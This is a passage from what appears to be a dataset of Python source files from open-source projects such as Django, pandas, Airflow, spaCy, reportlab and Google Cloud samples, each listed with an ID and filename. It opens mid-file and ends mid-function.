""""""
_WARNED = False


def s3_iter_bucket(
        bucket_name,
        prefix='',
        accept_key=None,
        key_limit=None,
        workers=16,
        retries=3,
        **session_kwargs
):
    """"""Deprecated.  Use smart_open.s3.iter_bucket instead.""""""
    global _WARNED
    from .s3 import iter_bucket
    if not _WARNED:
        logger.warning(_WARNING)
        _WARNED = True
    return iter_bucket(
        bucket_name=bucket_name,
        prefix=prefix,
        accept_key=accept_key,
        key_limit=key_limit,
        workers=workers,
        retries=retries,
        session_kwargs=session_kwargs
    )


__all__ = [
    'open',
    'parse_uri',
    'register_compressor',
    's3_iter_bucket',
    'smart_open',
]

__version__ = version.__version__"
JY217	JY217-csrf.py	"from functools import wraps

from django.middleware.csrf import CsrfViewMiddleware, get_token
from django.utils.decorators import decorator_from_middleware

csrf_protect = decorator_from_middleware(CsrfViewMiddleware)
csrf_protect.__name__ = ""csrf_protect""
csrf_protect.__doc__ = """"""
This decorator adds CSRF protection in exactly the same way as
CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or
using the decorator multiple times, is harmless and efficient.
""""""


class _EnsureCsrfToken(CsrfViewMiddleware):
    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.
    def _reject(self, request, reason):
        return None


requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)
requires_csrf_token.__name__ = ""requires_csrf_token""
requires_csrf_token.__doc__ = """"""
Use this decorator on views that need a correct csrf_token available to
RequestContext, but without the CSRF protection that csrf_protect
enforces.
""""""


class _EnsureCsrfCookie(CsrfViewMiddleware):
    def _reject(self, request, reason):
        return None

    def process_view(self, request, callback, callback_args, callback_kwargs):
        retval = super().process_view(request, callback, callback_args, callback_kwargs)
        # Force process_response to send the cookie
        get_token(request)
        return retval


ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)
ensure_csrf_cookie.__name__ = ""ensure_csrf_cookie""
ensure_csrf_cookie.__doc__ = """"""
Use this decorator to ensure that a view sets a CSRF cookie, whether or not it
uses the csrf_token template tag, or the CsrfViewMiddleware is used.
""""""


def csrf_exempt(view_func):
    """"""Mark a view function as being exempt from the CSRF view protection.""""""

    # view_func.csrf_exempt = True would also work, but decorators are nicer
    # if they don't have side effects, so return a new function.
    def wrapped_view(*args, **kwargs):
        return view_func(*args, **kwargs)

    wrapped_view.csrf_exempt = True
    return wraps(view_func)(wrapped_view)"
JY201	JY201-test_accessor_provider.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import dataclasses

from textwrap import dedent

import viktor._vendor.libcst as cst
from viktor._vendor.libcst.metadata import AccessorProvider, MetadataWrapper
from viktor._vendor.libcst.testing.utils import data_provider, UnitTest


class DependentVisitor(cst.CSTVisitor):
    METADATA_DEPENDENCIES = (AccessorProvider,)

    def __init__(self, *, test: UnitTest) -> None:
        self.test = test

    def on_visit(self, node: cst.CSTNode) -> bool:
        for f in dataclasses.fields(node):
            child = getattr(node, f.name)
            if type(child) is cst.CSTNode:
                accessor = self.get_metadata(AccessorProvider, child)
                self.test.assertEqual(accessor, f.name)

        return True


class AccessorProviderTest(UnitTest):
    @data_provider(
        (
            (
                """"""
                foo = 'toplevel'
                fn1(foo)
                fn2(foo)
                def fn_def():
                    foo = 'shadow'
                    fn3(foo)
                """""",
            ),
            (
                """"""
                global_var = None
                @cls_attr
                class Cls(cls_attr, kwarg=cls_attr):
                    cls_attr = 5
                    def f():
                        pass
                """""",
            ),
            (
                """"""
                iterator = None
                condition = None
                [elt for target in iterator if condition]
                {elt for target in iterator if condition}
                {elt: target for target in iterator if condition}
                (elt for target in iterator if condition)
                """""",
            ),
        )
    )
    def test_accessor_provier(self, code: str) -> None:
        wrapper = MetadataWrapper(cst.parse_module(dedent(code)))
        wrapper.visit(DependentVisitor(test=self))"
JY250	JY250-flock_tool.py	"#!/usr/bin/env python3
# Copyright (c) 2011 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""These functions are executed via gyp-flock-tool when using the Makefile
generator.  Used on systems that don't have a built-in flock.""""""

import fcntl
import os
import struct
import subprocess
import sys


def main(args):
    executor = FlockTool()
    executor.Dispatch(args)


class FlockTool:
    """"""This class emulates the 'flock' command.""""""

    def Dispatch(self, args):
        """"""Dispatches a string command to a method.""""""
        if len(args) < 1:
            raise Exception(""Not enough arguments"")

        method = ""Exec%s"" % self._CommandifyName(args[0])
        getattr(self, method)(*args[1:])

    def _CommandifyName(self, name_string):
        """"""Transforms a tool name like copy-info-plist to CopyInfoPlist""""""
        return name_string.title().replace(""-"", """")

    def ExecFlock(self, lockfile, *cmd_list):
        """"""Emulates the most basic behavior of Linux's flock(1).""""""
        # Rely on exception handling to report errors.
        # Note that the stock python on SunOS has a bug
        # where fcntl.flock(fd, LOCK_EX) always fails
        # with EBADF, that's why we use this F_SETLK
        # hack instead.
        fd = os.open(lockfile, os.O_WRONLY | os.O_NOCTTY | os.O_CREAT, 0o666)
        if sys.platform.startswith(""aix"") or sys.platform == ""os400"":
            # Python on AIX is compiled with LARGEFILE support, which changes the
            # struct size.
            op = struct.pack(""hhIllqq"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)
        else:
            op = struct.pack(""hhllhhl"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)
        fcntl.fcntl(fd, fcntl.F_SETLK, op)
        return subprocess.call(cmd_list)


if __name__ == ""__main__"":
    sys.exit(main(sys.argv[1:]))"
JY377	JY377-unresolved.py	"import typing

from lxml import etree

from zeep.xsd.types.base import Type
from zeep.xsd.types.collection import UnionType  # FIXME
from zeep.xsd.types.simple import AnySimpleType  # FIXME

if typing.TYPE_CHECKING:
    from zeep.xsd.types.complex import ComplexType
    from zeep.xsd.valueobjects import CompoundValue


class UnresolvedType(Type):
    def __init__(self, qname, schema):
        self.qname = qname
        assert self.qname.text != ""None""
        self.schema = schema

    def __repr__(self):
        return ""<%s(qname=%r)>"" % (self.__class__.__name__, self.qname.text)

    def render(
        self,
        node: etree._Element,
        value: typing.Union[list, dict, ""CompoundValue""],
        xsd_type: ""ComplexType"" = None,
        render_path=None,
    ) -> None:
        raise RuntimeError(
            ""Unable to render unresolved type %s. This is probably a bug.""
            % (self.qname)
        )

    def resolve(self):
        retval = self.schema.get_type(self.qname)
        return retval.resolve()


class UnresolvedCustomType(Type):
    def __init__(self, qname, base_type, schema):
        assert qname is not None
        self.qname = qname
        self.name = str(qname.localname)
        self.schema = schema
        self.base_type = base_type

    def __repr__(self):
        return ""<%s(qname=%r, base_type=%r)>"" % (
            self.__class__.__name__,
            self.qname.text,
            self.base_type,
        )

    def resolve(self):
        base = self.base_type
        base = base.resolve()

        cls_attributes = {""__module__"": ""zeep.xsd.dynamic_types""}

        if issubclass(base.__class__, UnionType):
            xsd_type = type(self.name, (base.__class__,), cls_attributes)
            return xsd_type(base.item_types)

        elif issubclass(base.__class__, AnySimpleType):
            xsd_type = type(self.name, (base.__class__,), cls_attributes)
            return xsd_type(self.qname)

        else:
            xsd_type = type(self.name, (base.base_class,), cls_attributes)
            return xsd_type(self.qname)"
JD292	JD292-splitIco.py	"#!/usr/bin/env python3
#
# Split a DWIN .ico file into separate images.
#
#  Copyright (c) 2020 Brent Burton
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.
#----------------------------------------------------------------

import os.path
import argparse
import DWIN_ICO

version = '2.0.7'

#----------------
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Split .ico into JPEG files')
        parser.add_argument('filename', type=str, nargs=1,
                            help='name of input .ico file to split')
        parser.add_argument('outputDir', type=str, nargs=1,
                            help='name of output directory to create')
        args = parser.parse_args()

        filename = args.filename[0]
        outputDir = args.outputDir[0]

        if not os.path.isfile(filename):
            raise RuntimeError(""ICO file '%s' doesn't exist"" % (filename))

        if os.path.exists(outputDir):
            raise RuntimeError(""Output directory '%s' already exists."" % (outputDir))

        print('Splitting %s into dir %s' % (filename, outputDir))
        ico = DWIN_ICO.DWIN_ICO_File()
        ico.splitFile(filename, outputDir)

    except Exception as e:
        print('Error: ', e)"
JY54	JY54-_typing.py	"""""""For neatly implementing static typing in packaging.

`mypy` - the static type analysis tool we use - uses the `typing` module, which
provides core functionality fundamental to mypy's functioning.

Generally, `typing` would be imported at runtime and used in that fashion -
it acts as a no-op at runtime and does not have any run-time overhead by
design.

As it turns out, `typing` is not vendorable - it uses separate sources for
Python 2/Python 3. Thus, this codebase can not expect it to be present.
To work around this, mypy allows the typing import to be behind a False-y
optional to prevent it from running at runtime and type-comments can be used
to remove the need for the types to be accessible directly during runtime.

This module provides the False-y guard in a nicely named fashion so that a
curious maintainer can reach here to read this.

In packaging, all static-typing related imports should be guarded as follows:

    from packaging._typing import TYPE_CHECKING

    if TYPE_CHECKING:
        from typing import ...

Ref: https://github.com/python/mypy/issues/3216
""""""

__all__ = [""TYPE_CHECKING"", ""cast""]

# The TYPE_CHECKING constant defined by the typing module is False at runtime
# but True while type checking.
if False:  # pragma: no cover
    from typing import TYPE_CHECKING
else:
    TYPE_CHECKING = False

# typing's cast syntax requires calling typing.cast at runtime, but we don't
# want to import typing at runtime. Here, we inform the type checkers that
# we're importing `typing.cast` as `cast` and re-implement typing.cast's
# runtime behavior in a block that is ignored by type checkers.
if TYPE_CHECKING:  # pragma: no cover
    # not executed at runtime
    from typing import cast
else:
    # executed at runtime
    def cast(type_, value):  # noqa
        return value"
JD361	JD361-create_key_labels.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and


# [START kms_create_key_labels]
def create_key_labels(project_id, location_id, key_ring_id, key_id):
    """"""
    Creates a new key in Cloud KMS with labels.

    Args:
        project_id (string): Google Cloud project ID (e.g. 'my-project').
        location_id (string): Cloud KMS location (e.g. 'us-east1').
        key_ring_id (string): ID of the Cloud KMS key ring (e.g. 'my-key-ring').
        key_id (string): ID of the key to create (e.g. 'my-labeled-key').

    Returns:
        CryptoKey: Cloud KMS key.

    """"""

    # Import the client library.
    from google.cloud import kms

    # Create the client.
    client = kms.KeyManagementServiceClient()

    # Build the parent key ring name.
    key_ring_name = client.key_ring_path(project_id, location_id, key_ring_id)

    # Build the key.
    purpose = kms.CryptoKey.CryptoKeyPurpose.ENCRYPT_DECRYPT
    algorithm = kms.CryptoKeyVersion.CryptoKeyVersionAlgorithm.GOOGLE_SYMMETRIC_ENCRYPTION
    key = {
        'purpose': purpose,
        'version_template': {
            'algorithm': algorithm,
        },
        'labels': {
            'team': 'alpha',
            'cost_center': 'cc1234'
        }
    }

    # Call the API.
    created_key = client.create_crypto_key(
        request={'parent': key_ring_name, 'crypto_key_id': key_id, 'crypto_key': key})
    print('Created labeled key: {}'.format(created_key.name))
    return created_key
# [END kms_create_key_labels]"
JY60	JY60-legacy.py	"from typing import Any, Dict, Optional, Union
from warnings import warn

from .api import from_bytes
from .constant import CHARDET_CORRESPONDENCE


def detect(
    byte_str: bytes, should_rename_legacy: bool = False, **kwargs: Any
) -> Dict[str, Optional[Union[str, float]]]:
    """"""
    chardet legacy method
    Detect the encoding of the given byte string. It should be mostly backward-compatible.
    Encoding name will match Chardet own writing whenever possible. (Not on encoding name unsupported by it)
    This function is deprecated and should be used to migrate your project easily, consult the documentation for
    further information. Not planned for removal.

    :param byte_str:     The byte sequence to examine.
    :param should_rename_legacy:  Should we rename legacy encodings
                                  to their more modern equivalents?
    """"""
    if len(kwargs):
        warn(
            f""charset-normalizer disregard arguments '{','.join(list(kwargs.keys()))}' in legacy function detect()""
        )

    if not isinstance(byte_str, (bytearray, bytes)):
        raise TypeError(  # pragma: nocover
            ""Expected object of type bytes or bytearray, got: ""
            ""{0}"".format(type(byte_str))
        )

    if isinstance(byte_str, bytearray):
        byte_str = bytes(byte_str)

    r = from_bytes(byte_str).best()

    encoding = r.encoding if r is not None else None
    language = r.language if r is not None and r.language != ""Unknown"" else """"
    confidence = 1.0 - r.chaos if r is not None else None

    # Note: CharsetNormalizer does not return 'UTF-8-SIG' as the sig get stripped in the detection/normalization process
    # but chardet does return 'utf-8-sig' and it is a valid codec name.
    if r is not None and encoding == ""utf_8"" and r.bom:
        encoding += ""_sig""

    if should_rename_legacy is False and encoding in CHARDET_CORRESPONDENCE:
        encoding = CHARDET_CORRESPONDENCE[encoding]

    return {
        ""encoding"": encoding,
        ""language"": language,
        ""confidence"": confidence,
    }"
JY481	JY481-instance_loaders.py	"class BaseInstanceLoader:
    """"""
    Base abstract implementation of instance loader.
    """"""

    def __init__(self, resource, dataset=None):
        self.resource = resource
        self.dataset = dataset

    def get_instance(self, row):
        raise NotImplementedError


class ModelInstanceLoader(BaseInstanceLoader):
    """"""
    Instance loader for Django model.

    Lookup for model instance by ``import_id_fields``.
    """"""

    def get_queryset(self):
        return self.resource.get_queryset()

    def get_instance(self, row):
        try:
            params = {}
            for key in self.resource.get_import_id_fields():
                field = self.resource.fields[key]
                params[field.attribute] = field.clean(row)
            if params:
                return self.get_queryset().get(**params)
            else:
                return None
        except self.resource._meta.model.DoesNotExist:
            return None


class CachedInstanceLoader(ModelInstanceLoader):
    """"""
    Loads all possible model instances in dataset avoid hitting database for
    every ``get_instance`` call.

    This instance loader work only when there is one ``import_id_fields``
    field.
    """"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        pk_field_name = self.resource.get_import_id_fields()[0]
        self.pk_field = self.resource.fields[pk_field_name]

        ids = [self.pk_field.clean(row) for row in self.dataset.dict]
        qs = self.get_queryset().filter(**{
            ""%s__in"" % self.pk_field.attribute: ids
            })

        self.all_instances = {
            self.pk_field.get_value(instance): instance
            for instance in qs
        }

    def get_instance(self, row):
        return self.all_instances.get(self.pk_field.clean(row))"
JY231	JY231-test_s3_to_ftp.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest import mock

from airflow.providers.amazon.aws.transfers.s3_to_ftp import S3ToFTPOperator

TASK_ID = ""test_s3_to_ftp""
BUCKET = ""test-s3-bucket""
S3_KEY = ""test/test_1_file.csv""
FTP_PATH = ""/tmp/remote_path.txt""
AWS_CONN_ID = ""aws_default""
FTP_CONN_ID = ""ftp_default""


class TestS3ToFTPOperator:
    @mock.patch(""airflow.providers.ftp.hooks.ftp.FTPHook.store_file"")
    @mock.patch(""airflow.providers.amazon.aws.hooks.s3.S3Hook.get_key"")
    @mock.patch(""airflow.providers.amazon.aws.transfers.s3_to_ftp.NamedTemporaryFile"")
    def test_execute(self, mock_local_tmp_file, mock_s3_hook_get_key, mock_ftp_hook_store_file):
        operator = S3ToFTPOperator(task_id=TASK_ID, s3_bucket=BUCKET, s3_key=S3_KEY, ftp_path=FTP_PATH)
        operator.execute(None)

        mock_s3_hook_get_key.assert_called_once_with(operator.s3_key, operator.s3_bucket)

        mock_local_tmp_file_value = mock_local_tmp_file.return_value.__enter__.return_value
        mock_s3_hook_get_key.return_value.download_fileobj.assert_called_once_with(mock_local_tmp_file_value)
        mock_ftp_hook_store_file.assert_called_once_with(operator.ftp_path, mock_local_tmp_file_value.name)"
JD8	JD8-cider.py	"# Filename: cider.py
#
#
# Description: Describes the class to compute the CIDEr
# (Consensus-Based Image Description Evaluation) Metric
#          by Vedantam, Zitnick, and Parikh (http://arxiv.org/abs/1411.5726)
#
# Creation Date: Sun Feb  8 14:16:54 2015
#
# Authors: Ramakrishna Vedantam <vrama91@vt.edu> and
# Tsung-Yi Lin <tl483@cornell.edu>
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

from .cider_scorer import CiderScorer


class Cider:
    """"""
    Main Class to compute the CIDEr metric

    """"""
    def __init__(self, n=4, df=""corpus""):
        """"""
        Initialize the CIDEr scoring function
        : param n (int): n-gram size
        : param df (string): specifies where to get the IDF values from
                    takes values 'corpus', 'coco-train'
        : return: None
        """"""
        # set cider to sum over 1 to 4-grams
        self._n = n
        self._df = df
        self.cider_scorer = CiderScorer(n=self._n, df_mode=self._df)

    def compute_score(self, gts, res):
        """"""
        Main function to compute CIDEr score
        : param  gts (dict) : {image:tokenized reference sentence}
        : param res (dict)  : {image:tokenized candidate sentence}
        : return: cider (float) : computed CIDEr score for the corpus
        """"""

        # clear all the previous hypos and refs
        self.cider_scorer.clear()

        for res_id in res:

            hypo = res_id['caption']
            ref = gts[res_id['image_id']]

            # Sanity check.
            assert(type(hypo) is list)
            assert(len(hypo) == 1)
            assert(type(ref) is list)
            assert(len(ref) > 0)
            self.cider_scorer += (hypo[0], ref)

        (score, scores) = self.cider_scorer.compute_score()

        return score, scores

    def method(self):
        return ""CIDEr"""
JD444	JD444-list_datasets.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START automl_video_classification_list_datasets_beta]
# [START automl_video_object_tracking_list_datasets_beta]
from google.cloud import automl_v1beta1 as automl


def list_datasets(project_id=""YOUR_PROJECT_ID""):
    """"""List datasets.""""""
    client = automl.AutoMlClient()
    # A resource that represents Google Cloud Platform location.
    project_location = f""projects/{project_id}/locations/us-central1""

    # List all the datasets available in the region.
    request = automl.ListDatasetsRequest(parent=project_location, filter="""")
    response = client.list_datasets(request=request)

    print(""List of datasets:"")
    for dataset in response:
        print(""Dataset name: {}"".format(dataset.name))
        print(""Dataset id: {}"".format(dataset.name.split(""/"")[-1]))
        print(""Dataset display name: {}"".format(dataset.display_name))
        print(""Dataset create time: {}"".format(dataset.create_time))
        # [END automl_video_object_tracking_list_datasets_beta]

        print(
            ""Video classification dataset metadata: {}"".format(
                dataset.video_classification_dataset_metadata
            )
        )
        # [END automl_video_classification_list_datasets_beta]

        # [START automl_video_object_tracking_list_datasets_beta]
        print(
            ""Video object tracking dataset metadata: {}"".format(
                dataset.video_object_tracking_dataset_metadata
            )
        )
        # [END automl_video_object_tracking_list_datasets_beta]"
JD483	JD483-tokenizer_exceptions.py	"# coding: utf8
from __future__ import unicode_literals

from ...symbols import ORTH, LEMMA, NORM

_exc = {}

_abbrev_exc = [
    # Weekdays abbreviations
    {ORTH: ""дш"", LEMMA: ""дүшәмбе""},
    {ORTH: ""сш"", LEMMA: ""сишәмбе""},
    {ORTH: ""чш"", LEMMA: ""чәршәмбе""},
    {ORTH: ""пш"", LEMMA: ""пәнҗешәмбе""},
    {ORTH: ""җм"", LEMMA: ""җомга""},
    {ORTH: ""шб"", LEMMA: ""шимбә""},
    {ORTH: ""яш"", LEMMA: ""якшәмбе""},
    # Months abbreviations
    {ORTH: ""гый"", LEMMA: ""гыйнвар""},
    {ORTH: ""фев"", LEMMA: ""февраль""},
    {ORTH: ""мар"", LEMMA: ""март""},
    {ORTH: ""мар"", LEMMA: ""март""},
    {ORTH: ""апр"", LEMMA: ""апрель""},
    {ORTH: ""июн"", LEMMA: ""июнь""},
    {ORTH: ""июл"", LEMMA: ""июль""},
    {ORTH: ""авг"", LEMMA: ""август""},
    {ORTH: ""сен"", LEMMA: ""сентябрь""},
    {ORTH: ""окт"", LEMMA: ""октябрь""},
    {ORTH: ""ноя"", LEMMA: ""ноябрь""},
    {ORTH: ""дек"", LEMMA: ""декабрь""},
    # Number abbreviations
    {ORTH: ""млрд"", LEMMA: ""миллиард""},
    {ORTH: ""млн"", LEMMA: ""миллион""},
]

for abbr in _abbrev_exc:
    for orth in (abbr[ORTH], abbr[ORTH].capitalize(), abbr[ORTH].upper()):
        _exc[orth] = [{ORTH: orth, LEMMA: abbr[LEMMA], NORM: abbr[LEMMA]}]
        _exc[orth + "".""] = [{ORTH: orth + ""."", LEMMA: abbr[LEMMA], NORM: abbr[LEMMA]}]

for exc_data in [  # ""etc."" abbreviations
    {ORTH: ""һ.б.ш."", NORM: ""һәм башка шундыйлар""},
    {ORTH: ""һ.б."", NORM: ""һәм башка""},
    {ORTH: ""б.э.к."", NORM: ""безнең эрага кадәр""},
    {ORTH: ""б.э."", NORM: ""безнең эра""},
]:
    exc_data[LEMMA] = exc_data[NORM]
    _exc[exc_data[ORTH]] = [exc_data]

TOKENIZER_EXCEPTIONS = _exc"
JD148	JD148-extract_status.py	"from time import time

from bot import DOWNLOAD_DIR, LOGGER
from bot.helper.ext_utils.bot_utils import get_readable_file_size, MirrorStatus, EngineStatus, get_readable_time
from bot.helper.ext_utils.fs_utils import get_path_size

class ExtractStatus:
    def __init__(self, name, size, gid, listener):
        self.__name = name
        self.__size = size
        self.__gid = gid
        self.__listener = listener
        self.__uid = listener.uid
        self.__start_time = time()
        self.message = listener.message

    def gid(self):
        return self.__gid

    def speed_raw(self):
        return self.processed_bytes() / (time() - self.__start_time)

    def progress_raw(self):
        try:
            return self.processed_bytes() / self.__size * 100
        except:
            return 0

    def progress(self):
        return f'{round(self.progress_raw(), 2)}%'

    def speed(self):
        return f'{get_readable_file_size(self.speed_raw())}/s'

    def name(self):
        return self.__name

    def size_raw(self):
        return self.__size

    def size(self):
        return get_readable_file_size(self.__size)

    def eta(self):
        try:
            seconds = (self.size_raw() - self.processed_bytes()) / self.speed_raw()
            return f'{get_readable_time(seconds)}'
        except:
            return '-'

    def status(self):
        return MirrorStatus.STATUS_EXTRACTING

    def processed_bytes(self):
        if self.__listener.newDir:
            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}10000"")
        else:
            return get_path_size(f""{DOWNLOAD_DIR}{self.__uid}"") - self.__size

    def download(self):
        return self

    def cancel_download(self):
        LOGGER.info(f'Cancelling Extract: {self.__name}')
        if self.__listener.suproc is not None:
            self.__listener.suproc.kill()
        self.__listener.onUploadError('extracting stopped by user!')

    def eng(self):
        return EngineStatus.STATUS_EXT"
JD523	JD523-predict.py	"import os
import json

import torch
from PIL import Image
from torchvision import transforms
import matplotlib.pyplot as plt

from model import resnet34


def main():
    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")

    data_transform = transforms.Compose(
        [transforms.Resize(256),
         transforms.CenterCrop(224),
         transforms.ToTensor(),
         transforms.Normalize([0.485, 0.456, 0.406], [0.229, 0.224, 0.225])])

    # load image
    img_path = ""../tulip.jpg""
    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)
    img = Image.open(img_path)
    plt.imshow(img)
    # [N, C, H, W]
    img = data_transform(img)
    # expand batch dimension
    img = torch.unsqueeze(img, dim=0)

    # read class_indict
    json_path = './class_indices.json'
    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)

    with open(json_path, ""r"") as f:
        class_indict = json.load(f)

    # create model
    model = resnet34(num_classes=5).to(device)

    # load model weights
    weights_path = ""./resNet34.pth""
    assert os.path.exists(weights_path), ""file: '{}' dose not exist."".format(weights_path)
    model.load_state_dict(torch.load(weights_path, map_location=device))

    # prediction
    model.eval()
    with torch.no_grad():
        # predict class
        output = torch.squeeze(model(img.to(device))).cpu()
        predict = torch.softmax(output, dim=0)
        predict_cla = torch.argmax(predict).numpy()

    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],
                                                 predict[predict_cla].numpy())
    plt.title(print_res)
    for i in range(len(predict)):
        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],
                                                  predict[i].numpy()))
    plt.show()


if __name__ == '__main__':
    main()"
JD449	JD449-authenticate_with_api_key.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START apikeys_authenticate_api_key]

from google.cloud import language_v1


def authenticate_with_api_key(quota_project_id: str, api_key_string: str) -> None:
    """"""
    Authenticates with an API key for Google Language service.

    TODO(Developer): Replace these variables before running the sample.

    Args:
        quota_project_id: Google Cloud project id that should be used for quota and billing purposes.
        api_key_string: The API key to authenticate to the service.
    """"""

    # Initialize the Language Service client and set the API key and the quota project id.
    client = language_v1.LanguageServiceClient(client_options={""api_key"": api_key_string,
                                                               ""quota_project_id"": quota_project_id})

    text = ""Hello, world!""
    document = language_v1.Document(
        content=text, type_=language_v1.Document.Type.PLAIN_TEXT
    )

    # Make a request to analyze the sentiment of the text.
    sentiment = client.analyze_sentiment(
        request={""document"": document}
    ).document_sentiment

    print(f""Text: {text}"")
    print(f""Sentiment: {sentiment.score}, {sentiment.magnitude}"")
    print(""Successfully authenticated using the API key"")

# [END apikeys_authenticate_api_key]"
JD507	JD507-test_arithmetic.py	"from datetime import timedelta

import numpy as np
import pytest

from pandas import (
    Interval,
    Timedelta,
    Timestamp,
)


@pytest.mark.parametrize(""method"", [""__add__"", ""__sub__""])
@pytest.mark.parametrize(
    ""interval"",
    [
        Interval(Timestamp(""2017-01-01 00:00:00""), Timestamp(""2018-01-01 00:00:00"")),
        Interval(Timedelta(days=7), Timedelta(days=14)),
    ],
)
@pytest.mark.parametrize(
    ""delta"", [Timedelta(days=7), timedelta(7), np.timedelta64(7, ""D"")]
)
def test_time_interval_add_subtract_timedelta(interval, delta, method):
    # https://github.com/pandas-dev/pandas/issues/32023
    result = getattr(interval, method)(delta)
    left = getattr(interval.left, method)(delta)
    right = getattr(interval.right, method)(delta)
    expected = Interval(left, right)

    assert result == expected


@pytest.mark.parametrize(""interval"", [Interval(1, 2), Interval(1.0, 2.0)])
@pytest.mark.parametrize(
    ""delta"", [Timedelta(days=7), timedelta(7), np.timedelta64(7, ""D"")]
)
def test_numeric_interval_add_timedelta_raises(interval, delta):
    # https://github.com/pandas-dev/pandas/issues/32023
    msg = ""|"".join(
        [
            ""unsupported operand"",
            ""cannot use operands"",
            ""Only numeric, Timestamp and Timedelta endpoints are allowed"",
        ]
    )
    with pytest.raises((TypeError, ValueError), match=msg):
        interval + delta

    with pytest.raises((TypeError, ValueError), match=msg):
        delta + interval


@pytest.mark.parametrize(""klass"", [timedelta, np.timedelta64, Timedelta])
def test_timedelta_add_timestamp_interval(klass):
    delta = klass(0)
    expected = Interval(Timestamp(""2020-01-01""), Timestamp(""2020-02-01""))

    result = delta + expected
    assert result == expected

    result = expected + delta
    assert result == expected"
JY383	JY383-__init__.py	"#Copyright ReportLab Europe Ltd. 2000-2021
#see license.txt for license details
__doc__=""""""The Reportlab PDF generation library.""""""
Version = ""3.5.68""
__version__=Version
__date__='20210625'

import sys, os

__min_python_version__ = (3,6)
if sys.version_info[0:2]!=(2, 7) and sys.version_info< __min_python_version__:
    raise ImportError(""""""reportlab requires Python 2.7+ or %s.%s+; other versions are unsupported.
If you want to try with other python versions edit line 10 of reportlab/__init__
to remove this error."""""" % (__min_python_version__))

#define these early in reportlab's life
isPy3 = sys.version_info[0]==3
if isPy3:
    def cmp(a,b):
        return -1 if a<b else (1 if a>b else 0)
    xrange = range
    ascii = ascii

    def _fake_import(fn,name):
        from importlib import machinery
        m = machinery.SourceFileLoader(name,fn)
        try:
            sys.modules[name] = m.load_module(name)
        except FileNotFoundError:
            raise ImportError('file %s not found' % ascii(fn))
else:
    from future_builtins import ascii
    xrange = xrange
    cmp = cmp
    def _fake_import(fn,name):
        if os.path.isfile(fn):
            import imp
            with open(fn,'rb') as f:
                sys.modules[name] = imp.load_source(name,fn,f)

#try to use dynamic modifications from
#reportlab.local_rl_mods.py
#reportlab_mods.py or ~/.reportlab_mods
try:
    import reportlab.local_rl_mods
except ImportError:
    pass

if not isPy3:
    PermissionError = ImportError

try:
    import reportlab_mods   #application specific modifications can be anywhere on python path
except ImportError:
    try:
        _fake_import(os.path.expanduser(os.path.join('~','.reportlab_mods')),'reportlab_mods')
    except (ImportError,KeyError,PermissionError):
        pass"
JY285	JY285-middleware.py	"import os
from datetime import datetime

import django

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')
django.setup()

import jwt
from channels.auth import AuthMiddlewareStack
from django.conf import settings
from django.contrib.auth.models import AnonymousUser
from channels.db import database_sync_to_async
from channels.middleware import BaseMiddleware

from django.db import close_old_connections

ALGORITHM = ""HS256""


from django.contrib.auth import get_user_model

User = get_user_model()


@database_sync_to_async
def get_user(token):
    try:
